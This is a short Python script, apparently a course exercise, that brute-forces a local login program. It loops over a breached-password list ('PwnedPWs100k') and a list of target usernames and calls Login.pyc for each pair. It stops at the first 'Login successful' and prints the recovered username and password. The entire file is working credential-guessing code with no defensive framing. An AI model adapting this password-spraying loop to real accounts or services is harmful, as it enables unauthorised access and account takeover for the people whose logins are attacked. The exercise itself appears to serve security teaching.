import sys
import datetime
import subprocess

start = datetime.datetime.now()
print(datetime.datetime.now())

# file opening
with open('../Q3/gang', 'r') as file:
    usernames = file.read().splitlines()

with open('../Q3/PwnedPWs100k', 'r') as file:
    passwords = file.read().splitlines()
    
usernames.remove("SkyRedFalcon914")
usernames.remove("StarSilverBear427")

username = ""
password = ""

for line in passwords:
    for name in usernames:
        result = subprocess.run(['python3', '../Q3/Login.pyc', name, line], capture_output=True, text=True)
        print(f"{line}, {name}")
        
        if result.stdout=='Login successful.\n':
            username = name
            password = line
            break
    if username != "":
        break

print(start)
print(f"User: {username} Pass: {password}")
print(datetime.datetime.now())
